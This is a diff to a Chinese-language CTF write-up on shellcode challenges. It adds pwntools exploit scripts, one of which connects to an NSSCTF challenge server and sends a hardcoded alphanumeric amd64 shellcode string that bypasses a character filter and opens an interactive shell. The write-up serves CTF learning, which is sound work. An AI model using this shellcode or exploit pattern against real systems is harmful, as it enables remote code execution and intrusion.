@@ -913,6 +913,7 @@ if __name__ == "__main__":
 先把 shellcode 打印出来放一个文件里，这里的 shellcode 是机器码。
 
 ```
+# written by Sonnety
 from pwn import *
 context(arch = "amd64",os = "linux")
 
@@ -965,6 +966,30 @@ def main():
     io.recvuntil(b"Show me your magic!\n")
     io.send(shellcode)  # sendline() 的 \n 可能会破坏字符检查，应该使用 send()
     # io.recvuntil(b"I Can't Read This!")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+然后有一个很类似的题目：
+
+[nss ctf 题目链接 safe_shellcode](https://www.nssctf.cn/problem/2933)
+
+这个题目它直接把伪代码以 .C 发下来了，有 `if(buf[i]<'0'||buf[i]>'z')` 的 判断，从 '0' 到 'z'，而且还是 call rax，所以 payload 都和上面的一模一样。
+
+```
+# written by Sonnety
+from pwn import *
+context.arch="amd64"
+
+host = "node5.anna.nssctf.cn"
+port = 23022
+shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+
+def main():
+    io=remote(host,port)
+    io.send(shellcode)
     io.interactive()
 
 if __name__ == "__main__":
